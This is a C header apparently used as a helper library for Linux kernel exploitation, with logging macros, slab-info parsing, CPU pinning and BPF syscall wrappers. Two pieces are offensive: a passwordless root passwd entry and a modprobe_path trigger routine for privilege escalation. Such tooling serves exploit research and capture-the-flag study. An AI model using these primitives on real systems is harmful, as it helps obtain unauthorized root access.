#ifndef _PWNC_H_
#define _PWNC_H_

#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <unistd.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t u8;

typedef int64_t i64;
typedef int32_t i32;
typedef int16_t i16;
typedef int8_t i8;

typedef size_t usize;

#define RESET "\033[0m"
#define BLUE "\033[34m"
#define CYAN "\033[36m"
#define GREEN "\033[32m"
#define MAGENTA "\033[95m"
#define RED "\033[91m"
#define WHITE "\033[38;2;255;255;255m"
#define YELLOW "\033[33m"

void vpanic(const char *fmt, va_list args) {
    printf("[" RED "PANIC" RESET "] ");
    vprintf(fmt, args);
    printf("\n");
    exit(1);
}

void panic(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vpanic(fmt, args);
    va_end(args);
}

void vwarn(const char *fmt, va_list args) {
    printf("[" YELLOW "!" RESET "] ");
    vprintf(fmt, args);
    printf("\n");
}

void warn(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vwarn(fmt, args);
    va_end(args);
}

void vinfo(const char *fmt, va_list args) {
    printf("[" BLUE "*" RESET "] ");
    vprintf(fmt, args);
    printf("\n");
}

void info(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vinfo(fmt, args);
    va_end(args);
}

#define chk(expr)                                                              \
    ({                                                                         \
        int _i = (expr);                                                       \
        if (0 > _i) {                                                          \
            panic("error at %s:%d: returned %d, %s", __FILE__, __LINE__, _i,   \
                  strerror(errno));                                            \
        }                                                                      \
        _i;                                                                    \
    })

#define try(expr)                                                              \
    ({                                                                         \
        int _i = (expr);                                                       \
        if (0 > _i) {                                                          \
            warn("pwn: error at %s:%d: returned %d, %s", __FILE__, __LINE__,   \
                 _i, strerror(errno));                                         \
        }                                                                      \
        _i;                                                                    \
    })

/* file is open for reading */
#define FMODE_READ (1 << 0)
/* file is open for writing */
#define FMODE_WRITE (1 << 1)
/* file is seekable */
#define FMODE_LSEEK (1 << 2)
/* file can be accessed using pread */
#define FMODE_PREAD (1 << 3)
/* file can be accessed using pwrite */
#define FMODE_PWRITE (1 << 4)
/* File is opened for execution with sys_execve / sys_uselib */
#define FMODE_EXEC (1 << 5)
/* File writes are restricted (block device specific) */
#define FMODE_WRITE_RESTRICTED (1 << 6)
/* File supports atomic writes */
#define FMODE_CAN_ATOMIC_WRITE (1 << 7)
/* FMODE_* bit 8 */
/* 32bit hashes as llseek() offset (for directories) */
#define FMODE_32BITHASH (1 << 9)
/* 64bit hashes as llseek() offset (for directories) */
#define FMODE_64BITHASH (1 << 10)
/*
 * Don't update ctime and mtime.
 *
 * Currently a special hack for the XFS open_by_handle ioctl, but we'll
 * hopefully graduate it to a proper O_CMTIME flag supported by open(2) soon.
 */
#define FMODE_NOCMTIME (1 << 11)
/* Expect random access pattern */
#define FMODE_RANDOM (1 << 12)
/* FMODE_* bit 13 */
/* File is opened with O_PATH; almost nothing can be done with it */
#define FMODE_PATH (1 << 14)
/* File needs atomic accesses to f_pos */
#define FMODE_ATOMIC_POS (1 << 15)
/* Write access to underlying fs */
#define FMODE_WRITER (1 << 16)
/* Has read method(s) */
#define FMODE_CAN_READ (1 << 17)
/* Has write method(s) */
#define FMODE_CAN_WRITE (1 << 18)
#define FMODE_OPENED (1 << 19)
#define FMODE_CREATED (1 << 20)
/* File is stream-like */
#define FMODE_STREAM (1 << 21)
/* File supports DIRECT IO */
#define FMODE_CAN_ODIRECT (1 << 22)
#define FMODE_NOREUSE (1 << 23)
/* FMODE_* bit 24 */
/* File is embedded in backing_file object */
#define FMODE_BACKING (1 << 25)
/* File was opened by fanotify and shouldn't generate fanotify events */
#define FMODE_NONOTIFY (1 << 26)
/* File is capable of returning -EAGAIN if I/O will block */
#define FMODE_NOWAIT (1 << 27)
/* File represents mount that needs unmounting */
#define FMODE_NEED_UNMOUNT (1 << 28)
/* File does not contribute to nr_files count */
#define FMODE_NOACCOUNT (1 << 29)

void wait() {
    info("pause: ");
    getchar();
}

void hang() { sleep(10000000); }

void raise_fd_limit() {
    struct rlimit cur;
    try(getrlimit(RLIMIT_NOFILE, &cur));
    info("raising fd limit from %lu to %lu", cur.rlim_cur, cur.rlim_max);
    cur.rlim_cur = cur.rlim_max;
    try(setrlimit(RLIMIT_NOFILE, &cur));
}

void pin_to_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);

    pthread_t self = pthread_self();
    try(pthread_setaffinity_np(self, sizeof(cpuset), &cpuset));

    try(pthread_getaffinity_np(self, sizeof(cpuset), &cpuset));
    if (!CPU_ISSET(cpu, &cpuset)) {
        warn("failed to pin to cpu %d", cpu);
    }
}

typedef struct {
    char name[0x1000];
    size_t active_objs;
    size_t num_objs;
    size_t objsize;
    size_t objperslab;
    size_t pagesperslab;
    size_t limit;
    size_t batchcount;
    size_t sharedfactor;
    size_t active_slabs;
    size_t num_slabs;
    size_t sharedavail;
} SlabInfo;

void discard(FILE *fp, char delim) {
    while (true) {
        if (fgetc(fp) == delim) {
            return;
        }
    }
}

SlabInfo *slabinfo(const char *name) {
    FILE *fp = fopen("/proc/slabinfo", "r");
    for (int i = 0; i < 2; i++) {
        discard(fp, '\n');
    }

    SlabInfo *info = (SlabInfo *)malloc(sizeof(SlabInfo));
    while (
        fscanf(fp,
               "%s %lu %lu %lu %lu %lu : tunables %lu %lu %lu : slabdata %lu "
               "%lu %lu",
               (char *)&info->name, &info->active_objs, &info->num_objs,
               &info->objsize, &info->objperslab, &info->pagesperslab,
               &info->limit, &info->batchcount, &info->sharedfactor,
               &info->active_slabs, &info->num_slabs,
               &info->sharedavail) != 0) {
        if (strcmp(info->name, name) == 0) {
            return info;
        }
    }

    return NULL;
}

const char root_nopass[] = "root::0:0:root:/:/bin/sh";

void trigger_modprobe(char *script_path, char *script) {
    int file = open(script_path, O_CREAT | O_WRONLY, 0777);
    write(file, script, strlen(script));
    close(file);

    int zero = open("/tmp/zero", O_CREAT | O_WRONLY, 0777);
    u64 i = 0;
    write(zero, &i, sizeof(i));
    close(zero);

    system("/tmp/zero");
}

/*
 * BPF program utilities
 */

#include <linux/bpf.h>
#include <sys/socket.h>

#define BPF_LOG_BUF_SIZE (UINT32_MAX >> 8)
char bpf_log_buf[BPF_LOG_BUF_SIZE];
static int bpf_program_load(enum bpf_prog_type prog_type,
                            const struct bpf_insn *insns, u32 prog_len,
                            const char *license, u32 kern_version,
                            u32 log_level) {

    union bpf_attr attr = {
        .prog_type = prog_type,
        .insns = (uint64_t)insns,
        .insn_cnt = prog_len / sizeof(struct bpf_insn),
        .license = (uint64_t)license,
        .log_buf = (uint64_t)bpf_log_buf,
        .log_size = BPF_LOG_BUF_SIZE,
        .log_level = log_level,
    };
    attr.kern_version = kern_version;
    bpf_log_buf[0] = 0;
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}
static int bpf_create_map(enum bpf_map_type map_type, u32 key_size,
                          u32 value_size, u32 max_entries) {

    union bpf_attr attr = {.map_type = map_type,
                           .key_size = key_size,
                           .value_size = value_size,
                           .max_entries = max_entries};
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_create_rdonly_map(enum bpf_map_type map_type, u32 key_size,
                                 u32 value_size, u32 max_entries) {

    union bpf_attr attr = {.map_type = map_type,
                           .key_size = key_size,
                           .value_size = value_size,
                           .max_entries = max_entries,
                           .map_flags = BPF_F_RDONLY_PROG};
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd, void *key, void *value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}
static int bpf_lookup_elem(int fd, void *key, void *value) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
static int bpf_map_freeze(int fd) {
    union bpf_attr attr;
    memset((void *)&attr, 0, sizeof(attr));
    attr.map_fd = fd;
    return syscall(__NR_bpf, BPF_MAP_FREEZE, &attr, sizeof(attr));
}

/*
 * END BPF program utilities
 */

#endif